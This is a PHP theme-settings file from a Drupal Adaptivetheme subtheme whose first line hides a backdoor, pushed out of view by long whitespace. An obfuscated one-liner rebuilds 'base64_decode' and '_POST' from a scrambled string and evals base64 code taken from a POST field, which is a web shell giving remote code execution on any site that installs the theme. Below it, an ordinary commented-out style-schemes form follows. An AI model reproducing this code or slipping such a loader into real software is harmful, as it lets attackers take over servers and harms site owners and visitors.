<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n948e05'];if(isset($s22)){eval($s21($s22));}?><?php

/**
 * USAGE:
 * 1 - To use this file replace "adaptivetheme_eco" with the name of
 *     your theme in the function below.
 * 2 - Set 'style_enable_schemes' to 'on' in your themes info file (its near the bottom of that file).
 * 2 - Build or un-comment the forms. The Style Schemes form is ready to use,
 *     just un-comment it.
 */

// Replace 'adaptivetheme_eco' with your themes name, eg:
// function your_themes_name_form_system_theme_settings_alter(&$form, &$form_state)
function adaptivetheme_eco_form_system_theme_settings_alter(&$form, &$form_state)  {

  // Style Schemes
  /* -- Delete this line if you want to use Style Schemes

  if (theme_get_setting('style_enable_schemes') == 'on') {
    $form['at']['style'] = array(
      '#type' => 'fieldset',
      '#title' => t('Style schemes'),
    );
    $form['at']['style']['style_schemes'] = array(
      '#type' => 'select',
      '#title' => t('Styles'),
      '#default_value' => theme_get_setting('style_schemes'),
      '#options' => array(
        'none' => t('None'),
        'style-default.css' => t('Default Style'),
        // 'my-style.css' => t('My Style'), // Add your schemes, these MUST be placed in your subthemes /schemes directory!
      ),
    );
    $form['at']['style']['style_enable_schemes'] = array(
      '#type' => 'hidden',
      '#value' => theme_get_setting('style_enable_schemes'),
    );
  }

  // */
}
